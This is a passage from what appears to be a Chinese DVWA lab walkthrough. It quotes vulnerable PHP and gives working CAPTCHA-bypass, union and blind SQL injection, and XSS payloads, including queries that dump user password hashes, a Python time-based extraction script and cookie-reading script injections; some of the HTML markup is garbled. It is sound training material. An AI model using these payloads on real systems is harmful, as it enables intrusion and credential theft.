passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check to see if they did stage 1 if( !$_POST[ &#39;passed_captcha&#39; ] ) { $html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; $hide_form = false; return; } // Check to see if both password match if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the end user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with the passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } mysql_close(); } ?&gt;</code></pre><p>Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。<br>可以通过抓包，更改step参数，增加passed_captcha参数，绕过验证码<br>&amp;passed_captcha=true</p><p>High：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_SERVER[ &#39;REMOTE_ADDR&#39; ], $_POST[ &#39;recaptcha_challenge_field&#39; ], $_POST[ &#39;recaptcha_response_field&#39; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid &amp;&amp; ( $_POST[ &#39;recaptcha_response_field&#39; ] != &#39;hidd3n_valu3&#39; || $_SERVER[ &#39;HTTP_USER_AGENT&#39; ] != &#39;reCAPTCHA&#39; ) ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Ops. Password mismatch $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>可以看到，服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数recaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。<br>更改参数recaptcha_response_field以及http包头的User-Agent：等于reCAPTCHA</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201710241515_889.png" alt=""></p><p>impossible：<br>该级别代码未发现漏洞</p><h3 id="八：SQL-Injection（SQL注入）"><a href="#八：SQL-Injection（SQL注入）" class="headerlink" title="八：SQL Injection（SQL注入）"></a>八：SQL Injection（SQL注入）</h3><p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p><p>手工注入（非盲注）的步骤。</p><pre><code>1.判断是否存在注入，注入是字符型还是数字型2.猜解SQL查询语句中的字段数3.确定显示的字段顺序4.获取当前数据库5.获取数据库中的表6.获取表中的字段名7.下载数据</code></pre><p>Low：</p><pre><code>&lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_REQUEST[ &#39;id&#39; ]; // Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i   = 0; while( $i &lt; $num ) { // Get values $first = mysql_result( $result, $i, &quot;first_name&quot; ); $last  = mysql_result( $result, $i, &quot;last_name&quot; ); // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; // Increase loop count $i++; } mysql_close(); } ?&gt;</code></pre><p>1.<img src="http://oy0tigw51.bkt.clouddn.com/201710241530_443.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201710241533_295.png" alt=""><br>2.猜解SQL查询语句中的字段数<br>union select 1,2,3<br>3.确定显示的字段顺序<br>1′ union select 1,2 #<br>4.获取当前数据库</p><p>输入1′ union select 1,database() #，<br>5.获取数据库中的表</p><p>输入1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，<br>6.获取表中的字段名</p><p>输入1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #<br>7.下载数据</p><p>输入1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #<br>的数据<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241607_214.png" alt=""></p><p>得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p><h5 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h5><p>&lt;?php </p><p>if( isset( $_POST[ ‘Submit’ ] ) ) {<br>    // Get input<br>    $id = $_POST[ ‘id’ ];<br>    $id = mysql_real_escape_string( $id ); </p><pre><code>// Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i   = 0; while( $i &lt; $num ) {     // Display values     $first = mysql_result( $result, $i, &quot;first_name&quot; );     $last  = mysql_result( $result, $i, &quot;last_name&quot; );     // Feedback for end user     echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;     // Increase loop count     $i++; } //mysql_close(); </code></pre><p>} </p><p>?&gt;</p><p>区别代码：</p><blockquote><p>$id = mysql_real_escape_string( $id );</p></blockquote><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入<br>依然可以通过抓包改参数，提交恶意构造的查询参数。<br>1.判断是否存在注入，注入是字符型还是数字型<br>1.id为1 or 1=1 #<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241617_591.png" alt=""><br>查询成功<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241618_406.png" alt=""><br>2.猜解SQL查询语句中的字段数</p><p>抓包更改参数id为1 order by 2 #，查询成功：<br>抓包更改参数id为1 order by 3 #，报错：说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p><p>3.确定显示的字段顺序</p><p>抓包更改参数id为1 union select 1,2 #，查询成功：<br>说明执行的SQL语句为select First name,Surname from 表 where ID=id…</p><p>4.获取当前数据库</p><p>抓包更改参数id为1 union select 1,database() #，查询成功：<br>说明当前的数据库为dvwa。</p><p>5.获取数据库中的表</p><p>抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p><p>说明数据库dvwa中一共有两个表，guestbook与users。</p><p>6.获取表中的字段名</p><p>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：</p><p>这是因为单引号被转义了，变成了\’。</p><p>可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：</p><p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p><p>7.得到数据</p><p>抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241642_694.png" alt=""><br>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p><p>High：</p><p>&lt;?php </p><p>if( isset( $_SESSION [ ‘id’ ] ) ) {<br>    // Get input<br>    $id = $_SESSION[ ‘id’ ]; </p><pre><code>// Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i   = 0; while( $i &lt; $num ) {     // Get values     $first = mysql_result( $result, $i, &quot;first_name&quot; );     $last  = mysql_result( $result, $i, &quot;last_name&quot; );     // Feedback for end user     echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;     // Increase loop count     $i++; } mysql_close(); </code></pre><p>} </p><p>?&gt; </p><p>与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p><blockquote><p>$query  = “SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;”; </p></blockquote><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。<br>输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</p><p>Impossible：<br>Impossible级别的代码采用了PDO技术，暂时不会</p><p><a href="http://blog.chinaunix.net/uid-11582448-id-4432211.html" target="_blank" rel="external">SQLmap注入方法注入dvwa</a></p><h3 id="九：SQL-Injection-Blind"><a href="#九：SQL-Injection-Blind" class="headerlink" title="九：SQL Injection(Blind)"></a>九：SQL Injection(Blind)</h3><p>手工盲注的步骤（可与之前的手工注入作比较）：</p><pre><code>1.判断是否存在注入，注入是字符型还是数字型2.猜解当前数据库名3.猜解数据库中的表名4.猜解表中的字段名5.猜解数据</code></pre><p>Low：</p><p>&lt;?php </p><p>if( isset( $_GET[ ‘Submit’ ] ) ) {<br>    // Get input<br>    $id = $_GET[ ‘id’ ]; </p><pre><code>// Check database $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) {     // Feedback for end user     echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else {     // User wasn&#39;t found, so the page wasn&#39;t!     header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; );     // Feedback for end user     echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } mysql_close(); </code></pre><p>} </p><p>?&gt; </p><p>Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种</p><p>基于布尔的盲注：<br>1.判断是否存在注入，注入是字符型还是数字型<br>输入1，显示相应用户存在：<br>输入1’ and 1=1 #，显示存在：<br>输入1’ and 1=2 #，显示不存在：<br>说明存在字符型的SQL盲注。<br>2.猜解当前数据库名</p><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p><pre><code>输入1’ and length(database())=1 #，显示不存在；输入1’ and length(database())=2 #，显示不存在；输入1’ and length(database())=3 #，显示不存在；输入1’ and length(database())=4 #，显示存在：</code></pre><p>说明数据库名长度为4。</p><p>下面采用二分法猜解数据库名。</p><pre><code>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。…</code></pre><p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。<br>3.猜解数据库中的表名</p><p>首先猜解数据库中表的数量：</p><pre><code>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在</code></pre><p>说明数据库中共有两个表。</p><p>接着挨个猜解表名：</p><pre><code>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在…1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在</code></pre><p>说明第一个表名长度为9。</p><pre><code>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在</code></pre><p>说明第一个表的名字的第一个字符为小写字母g。</p><p>…</p><p>重复上述步骤，即可猜解出两个表名（guestbook、users）。<br>4.猜解表中的字段名</p><p>首先猜解表中字段的数量：</p><pre><code>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在…1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在</code></pre><p>说明users表有8个字段。</p><p>接着挨个猜解字段名：</p><pre><code>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在…1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在</code></pre><p>说明users表的第一个字段为7个字符长度。</p><p>采用二分法，即可猜解出所有字段名。<br>5.猜解数据</p><p>同样采用二分法。</p><p>还可以使用基于时间的盲注：<br>1.判断是否存在注入，注入是字符型还是数字型</p><pre><code>输入1’ and sleep(5) #，感觉到明显延迟；输入1 and sleep(5) #，没有延迟；</code></pre><p>说明存在字符型的基于时间的盲注。<br>2.猜解当前数据库名</p><p>首先猜解数据名的长度：</p><pre><code>1’ and if(length(database())=1,sleep(5),1) # 没有延迟1’ and if(length(database())=2,sleep(5),1) # 没有延迟1’ and if(length(database())=3,sleep(5),1) # 没有延迟1’ and if(length(database())=4,sleep(5),1) # 明显延迟</code></pre><p>说明数据库名长度为4个字符。</p><p>接着采用二分法猜解数据库名：</p><pre><code>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟…1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟说明数据库名的第一个字符为小写字母d。…</code></pre><p>重复上述步骤，即可猜解出数据库名。<br>3.猜解数据库中的表名</p><p>首先猜解数据库中表的数量：</p><pre><code>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</code></pre><p>说明数据库中有两个表。</p><p>接着挨个猜解表名：</p><pre><code>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟…1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</code></pre><p>说明第一个表名的长度为9个字符。</p><p>采用二分法即可猜解出表名。<br>4.猜解表中的字段名</p><p>首先猜解表中字段的数量：</p><pre><code>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟…1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟</code></pre><p>说明users表中有8个字段。</p><p>接着挨个猜解字段名：</p><pre><code>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟…1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</code></pre><p>说明users表的第一个字段长度为7个字符。</p><p>采用二分法即可猜解出各个字段名。<br>5.猜解数据</p><p>同样采用二分法。太浪费时间了。推荐写python脚本</p><pre><code># -*-coding:utf-8-*-  import requests  import timepayloads = &#39;abcdefghijklmnopqrstuvwxyz0123456789@_.{}-&#39;flag = &#39;&#39;url = &quot;http://222.18.158.243:4609/index.php&quot;print(&#39;test1&#39;)for x in range(1,7):for char in payloads:starttime = time.time()payload = {&quot;id&quot;: &quot;1 and if(substring(database(), &quot;+str(x)+&quot;, 1)=&#39;&quot;+char+&quot;&#39;,sleep(6),1)#&quot;}rev = requests.get(url, cookies=cookies, params=payload)if time.time() - starttime &gt; 6:flag += charprint(&#39;DatabaseName = &#39;+flag)</code></pre><p>Medium：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Get input $id = $_POST[ &#39;id&#39; ]; $id = mysql_real_escape_string( $id ); // Check database $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } //mysql_close(); } ?&gt; </code></pre><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p><p>\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p><p>基于布尔的盲注：</p><pre><code>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</code></pre><p>基于时间的盲注：</p><pre><code>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</code></pre><p>High：</p><pre><code>&lt;?php if( isset( $_COOKIE[ &#39;id&#39; ] ) ) { // Get input $id = $_COOKIE[ &#39;id&#39; ]; // Check database $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // Might sleep a random amount if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } // User wasn&#39;t found, so the page wasn&#39;t! header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } mysql_close(); } ?&gt;</code></pre><p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。<br>漏洞利用</p><p>虽然添加了LIMIT 1，但是可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，基于布尔的盲注：</p><pre><code>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</code></pre><p>Impossible</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Submit&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $id = $_GET[ &#39;id&#39; ]; // Was a number entered? if(is_numeric( $id )) { // Check the database $data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); $data-&gt;execute(); // Get results if( $data-&gt;rowCount() == 1 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // User wasn&#39;t found, so the page wasn&#39;t! header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } } } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。 基本无法注入。</p><h3 id="十-反射型XSS"><a href="#十-反射型XSS" class="headerlink" title="十:反射型XSS"></a>十:反射型XSS</h3><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。<br>推荐xss cheat sheet<br><a href="http://www.52bug.cn/?post=211" target="_blank" rel="external">xss漏洞检测指南</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241842_78.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241843_306.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241844_339.png" alt=""></p><p>Low：</p><pre><code>&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Feedback for end user echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; } ?&gt;</code></pre><p>无验证，直接注入</p><script>alert(document.cookie)</script>爆出cookie内容![](http://oy0tigw51.bkt.clouddn.com/201710241848_956.png)Medium：    <?php     // Is there any input?     if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Get input     $name = str_replace( '<script>', '', $_GET[ 'name' ] );     // Feedback for end user     echo "<pre>Hello ${name}</pre>";     }     ?>可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script>删除，这种防护机制是可以被轻松绕过的。双写绕过输入<sc<script>ript>alert(/xss/)</script>，成功弹框：![](http://oy0tigw51.bkt.clouddn.com/201710241856_385.png)大小写混淆绕过输入<script>alert(/xss/)</script>，成功弹框High：    <?php     // Is there any input?     if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Get input     $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );     // Feedback for end user     echo "<pre>Hello ${name}";     }     ?>可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。绕过思路：标签很多，换一种标签即可。这里用img<img src="1" onerror="alert(document.cookie)">![](http://oy0tigw51.bkt.clouddn.com/201710241900_85.png)Impossible：    <?php     // Is there any input?     if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );     // Get input     $name = htmlspecialchars( $_GET[ 'name' ] );     // Feedback for end user     echo "<pre>Hello ${name}";     }     // Generate Anti-CSRF token     generateSessionToken();     ?>Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素。无法注入。### 十一：存储型XSSLow：    <?php     if( isset( $_POST[ 'btnSign' ] ) ) {     // Get input     $message = trim( $_POST[ 'mtxMessage' ] );     $name= trim( $_POST[ 'txtName' ] );     // Sanitize message input     $message = stripslashes( $message );     $message = mysql_real_escape_string( $message );     // Sanitize name input     $name = mysql_real_escape_string( $name );     // Update database     $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";     $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '' );     //mysql_close();     }     ?>stripslashes(string)函数删除字符串中的反斜杠。可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。<script>alert(/xss/)</script> name一栏前端有字数限制，burp抓包改为<script>alert(/name/)</script><p>Medium</p><pre><code>&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name= trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name ); $name = mysql_real_escape_string( $name ); // Update database $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt;</code></pre><p>查看源码发现Name只过滤了<scrpit>标签<br>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<b>标签。<br>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。<br>burp抓包改name参数为<sc<script>ript&gt;alert(/xss/):<br>2.大小写混淆绕过<br>抓包改name参数为<script>alert(/xss/)</script>:<br>High</sc<script></b></scrpit></p><pre><code>&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name= trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name ); $name = mysql_real_escape_string( $name ); // Update database $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt;</code></pre><p>$name = preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $name );<br>绕过思路：HTML页面修改Name的最大输入长度，注入Name，注入换一种标签，这里用img<br><img src="1" onerror="alert(document.cookie)"></p><p>Impossible</p><pre><code>&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name= trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = mysql_real_escape_string( $name ); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &#39;INSERT INTO guestbook 